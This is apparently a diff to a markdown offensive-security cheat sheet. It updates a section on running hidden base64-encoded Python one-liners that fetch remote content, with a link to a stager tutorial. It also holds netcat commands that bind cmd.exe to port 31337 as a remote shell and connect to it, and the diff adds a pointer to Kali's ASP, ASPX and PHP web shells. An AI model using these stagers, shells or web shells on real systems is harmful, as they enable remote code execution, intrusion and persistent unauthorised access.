@@ -1,6 +1,3 @@
-
-
-
 #### Execute Hidden Python Command (In One Line, using base64 encoding) 
 [More Info](https://null-byte.wonderhowto.com/how-to/execute-hidden-python-commands-one-line-stager-0236732/)
 ```
@@ -13,3 +10,6 @@ import json; import requests; import base64; data = (requests.get("https://githu
 nc --Lp 31337 --vv --e cmd.exe
 nc 10.73.31.59 31337
 ```
+
+#### Web Shell  
+you can find asp,aspx,php web shell in kali linux /usr/share/webshells/
